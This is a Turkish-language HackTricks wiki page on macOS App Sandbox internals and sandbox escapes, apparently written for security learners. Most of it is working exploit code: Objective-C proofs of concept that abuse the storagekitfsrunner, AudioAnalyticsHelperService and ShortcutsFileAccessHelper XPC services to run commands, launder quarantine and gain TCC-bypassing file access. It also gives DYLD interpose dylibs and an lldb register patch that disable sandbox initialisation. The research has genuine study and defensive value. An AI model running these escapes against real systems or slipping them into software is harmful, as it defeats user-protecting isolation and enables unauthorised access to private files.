# macOS Sandbox Debug ve Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox yükleme süreci

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Görsel: <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Önceki görselde, **`com.apple.security.app-sandbox`** entitlement'ına sahip bir uygulama çalıştırıldığında **sandbox'ın nasıl yüklendiği** görülebilir.

Compiler, `/usr/lib/libSystem.B.dylib` dosyasını binary'ye linkler.

Ardından **`libSystem.B`**, **`xpc_pipe_routine`** uygulamanın entitlement'larını **`securityd`**'ye gönderene kadar başka birkaç function'ı çağırır. Securityd, process'in Sandbox içinde quarantine edilip edilmemesi gerektiğini kontrol eder ve gerekiyorsa quarantine eder.\
Son olarak sandbox, **`__sandbox_ms`** çağrısıyla etkinleştirilir; bu da **`__mac_syscall`**'ı çağırır.<sup>[[1]](#references)[[3]](#references)</sup>

## Olası Bypass'ler

### Quarantine attribute'unu bypass etme

**Sandboxed process'ler tarafından oluşturulan dosyalara**, sandbox escape'lerini önlemek için **quarantine attribute'u** eklenir: yeni bir application bırakıp çalıştırmayı denerseniz quarantine flag'i bunu durdurur. Bu nedenle, **quarantine attribute'u olmadan bir file veya folder bırakabiliyorsanız, App Sandbox'tan escape edebilirsiniz** — yalnızca bir `.app` bundle'ı bırakıp `open` ile çalıştırın; çünkü yeni başlatılan process LaunchServices altında çalışır ve sizin sandbox'ınız altında çalışmaz.

**Quarantine edilmemiş bir drop** elde etmenin güvenilir yolu, **başka bir process'ten file'ı sizin için oluşturmasını istemektir**. Mickey Jin tarafından yazılan [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) içinde belgelendiği üzere, **App Sandbox** bırakılan file'ları quarantine ile işaretler, ancak Service Sandbox altında çalışan **XPC services** bunu yapmaz. Bu nedenle, kimlik doğrulaması gerektirmeyen çeşitli XPC services bir "quarantine laundering" primitive'i olarak kullanılabilir:<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) ve **CVE-2023-32414** (`ArchiveService`): sandboxed app tarafından iletilen bir archive'ı, quarantine xattr'ını çıkarılan içeriğe aktarmadan seçilen bir konuma çıkarır.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): `submitSignpostDataWithConfig:` içindeki path traversal, **quarantine olmadan arbitrary directory'ler oluşturulmasına** izin veriyordu; bu da container dışında eksiksiz bir `.app` bundle yapısı oluşturmak için yeterlidir.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): quarantined bir DMG'yi, ortaya çıkan device'ı quarantine etmeden attach eder; böylece mounted volume üzerindeki app'ler çalıştırılabilir.

> [!TIP]
> Extraction genellikle **executable permission bit'ini kaldırır**. CVE-2023-27944'te kullanılan workaround, bundle'ın main executable'ı olarak mevcut ve imzalı bir system binary'sine (ör. `/System/Library/CoreServices/Automator Application Stub`) **symlink** yerleştirmekti; bu yöntem, bırakılan file üzerinde `+x` iznine ihtiyaç duymadan çalıştırılabilir kalmasını sağlar.

> [!CAUTION]
> Bunun çalışmasının nedeni, kontrolün çalıştırılan item üzerindeki **flag** tarafından yönlendirilmesidir: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, ancak bundan sonra *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Çalıştırdığınız bundle üzerinde flag olmaması, Gatekeeper kontrolünün yapılmaması anlamına gelir — CVE'lerin yukarıda sağladığı primitive tam olarak budur.<sup>[[5]](#references)</sup>
>
> Bir `.app` bundle'ı daha önce çalıştırılmak üzere authorize edilmişse (üzerinde "authorized to run" flag'ine sahip bir quarantine xattr'ı varsa), bunu da abuse edebilirsiniz... ancak bu durumda artık bazı privileged TCC perms'lerine sahip olmadığınız sürece **`.app`** bundle'larının içine yazamazsınız (sandbox içinde bu izinlere sahip olmayacaksınız).

### Open functionality'sini abuse etme

[**Word sandbox bypass'inin son örneklerinde**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), **`open`** cli functionality'sinin sandbox'ı bypass etmek için nasıl abuse edilebileceği görülebilir.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Bir uygulamanın **sandboxed olması amaçlanmış olsa bile** (`com.apple.security.app-sandbox`), örneğin bir **LaunchAgent** (`~/Library/LaunchAgents`) üzerinden **çalıştırılıyorsa** sandbox'ı bypass etmek mümkündür.\
[**Bu postta**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) açıklandığı üzere, sandboxed bir uygulamayla persistence elde etmek istiyorsanız onu otomatik olarak bir LaunchAgent şeklinde çalışacak hâle getirebilir ve muhtemelen DyLib environment variables üzerinden malicious code inject edebilirsiniz.<sup>[[6]](#references)</sup>

### Auto Start Locations'ı abuse etme

Bir sandboxed process, **daha sonra unsandboxed bir uygulamanın binary'yi çalıştıracağı** bir konuma **yazabiliyorsa**, binary'yi oraya yerleştirerek **escape edebilir**. Bu tür konumlara iyi birer örnek `~/Library/LaunchAgents` veya `/System/Library/LaunchDaemons`'dır.

Bunun için **2 step** bile gerekebilir: **daha permissive bir sandbox'a** (`file-read*`, `file-write*`) sahip bir process'in, kodunuzu çalıştırmasını ve bu kodun daha sonra **unsandboxed olarak çalıştırılacağı** bir konuma yazmasını sağlamak.

**Auto Start locations** hakkındaki bu sayfaya bakın:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Diğer process'leri abuse etme

Sandboxed process'ten, daha az restrictive sandbox'larda (veya sandbox olmadan) çalışan diğer process'leri **compromise** edebiliyorsanız, onların sandbox'larına escape edebilirsiniz:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Kullanılabilir System ve User Mach services

Sandbox ayrıca `application.sb` profilinde tanımlanan XPC üzerinden belirli **Mach services** ile iletişim kurulmasına izin verir. Bu services'lardan birini **abuse** edebiliyorsanız, **sandbox'tan escape edebilirsiniz**.

[Bu writeup'ta](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) belirtildiği üzere, Mach services hakkındaki bilgiler `/System/Library/xpc/launchd.plist` içinde saklanır. Bu file içinde `<string>System</string>` ve `<string>User</string>` araması yaparak tüm System ve User Mach services'larını bulmak mümkündür.<sup>[[4]](#references)</sup>

Ayrıca, `bootstrap_look_up` çağrılarak bir Mach service'ın sandboxed application için kullanılabilir olup olmadığı kontrol edilebilir:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Kullanılabilir PID Mach services

Bu Mach services, ilk kez [bu writeup'ta sandbox'tan kaçmak için](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) kötüye kullanıldı. O zamana kadar, bir application ve framework'ü tarafından **gerekli olan tüm XPC services**, application'ın PID domain'inde görünür durumdaydı (bunlar `ServiceType` değeri `Application` olan Mach Services'tir).<sup>[[4]](#references)</sup>

Bir **PID Domain XPC service ile iletişim kurmak** için, onu application içinde aşağıdakine benzer bir satırla kaydetmek yeterlidir:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Ayrıca, `System/Library/xpc/launchd.plist` içinde `<string>Application</string>` araması yaparak tüm **Application** Mach servislerini bulmak mümkündür.

Geçerli xpc servislerini bulmanın başka bir yolu da şuradakileri kontrol etmektir:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Bu tekniği kötüye kullanan birkaç örnek [**orijinal yazımda**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) bulunabilir; ancak aşağıda bazı özetlenmiş örnekler yer almaktadır.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Bu servis, her zaman `YES` döndürerek tüm XPC bağlantılarına izin verir ve `runTask:arguments:withReply:` yöntemi, isteğe bağlı parametrelerle rastgele bir komutu çalıştırır.

Exploit "şu kadar basitti":
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Bu XPC service, her client için her zaman YES döndürerek erişime izin veriyordu ve `createZipAtPath:hourThreshold:withReply:` metodu temel olarak sıkıştırılacak klasörün path'ini belirtmeye olanak tanıyor, ardından bu klasörü bir ZIP dosyasına sıkıştırıyordu.

Bu nedenle sahte bir app klasör yapısı oluşturmak, bunu sıkıştırmak, ardından decompress edip çalıştırarak sandbox'dan çıkmak mümkündü; çünkü yeni dosyalarda quarantine attribute bulunmayacaktı.

Exploit şu şekildeydi:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Bu XPC servisi, herhangi bir bağlantıyı kabul eden `extendAccessToURL:completion:` yöntemi aracılığıyla XPC client'ına rastgele bir URL için okuma ve yazma erişimi verme imkanı sunar. XPC servisinde FDA bulunduğundan, bu izinleri kötüye kullanarak TCC'yi tamamen bypass etmek mümkündür.

Exploit şu şekildeydi:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Statik Derleme ve Dinamik Bağlama

[**Bu araştırma**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) Sandbox'ı bypass etmenin 2 yolunu keşfetti. Çünkü Sandbox, **libSystem** library yüklendiğinde userland üzerinden uygulanır. Bir binary bu library'nin yüklenmesini önleyebilirse Sandbox'a hiçbir zaman tabi olmaz:<sup>[[2]](#references)</sup>

- Binary **tamamen statik olarak derlenmişse**, bu library'nin yüklenmesini önleyebilir.
- **Binary'nin herhangi bir library yüklemesi gerekmiyorsa** (çünkü linker da libSystem içindedir), libSystem'i yüklemesi gerekmez.

### Shellcodes

**Shellcodes**'un bile ARM64 üzerinde `libSystem.dylib` içine linklenmesi gerektiğini unutmayın:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Devralınmayan kısıtlamalar

**[Bu writeup'ın bonus bölümünde](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** açıklandığı üzere, aşağıdaki gibi bir sandbox kısıtlaması:<sup>[[4]](#references)</sup>
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
örneğin şunu çalıştıran yeni bir process tarafından bypass edilebilir:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Ancak elbette bu yeni süreç, üst süreçteki entitlement'ları veya ayrıcalıkları devralmayacaktır.

### Entitlements

Bir uygulamanın aşağıdaki örnekte olduğu gibi belirli bir **entitlement**'ı varsa bazı **eylemlerin** **sandbox tarafından izin verilebileceğini** unutmayın:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

**Interposting** hakkında daha fazla bilgi için:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### sandbox'u önlemek için `_libsecinit_initializer` üzerinde Interpost edin
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Sandbox'ı engellemek için `__mac_syscall` işlevine interpose uygulama
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### lldb ile Sandbox debug etme ve bypass etme

Let's compile an application that should be sandboxed:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Ardından uygulamayı derleyin:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> Uygulama, **Sandbox'ın izin vermeyeceği** **`~/Desktop/del.txt`** dosyasını **okumaya** çalışacaktır.\
> Sandbox aşıldığında dosyayı okuyabileceği için orada bir dosya oluşturun:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Sandbox'ın ne zaman yüklendiğini görmek için uygulamada debug yapalım:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Sandbox bypasslanmış olsa bile TCC**, kullanıcının sürecin masaüstündeki dosyaları okumasına izin verip vermediğini soracaktır

## Referanslar

- [1] [Jonathan Levin - Apple Sandbox: Çıkmazın Derinliklerine (HITB GSEC 2016 slaytları)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Mac App Store Sandbox Escape](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Apple Sandbox: Çıkmazın Derinliklerine (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - macOS Sandbox Escapes için Yeni Bir Dönem](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (XPC services aracılığıyla quarantine uygulanmamış dosyaların bırakılması: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Açıklayıcı: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): DyLib Injection kullanarak Telegram ile macOS TCC Bypass (Bölüm 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)

{{#include ../../../../../banners/hacktricks-training.md}}
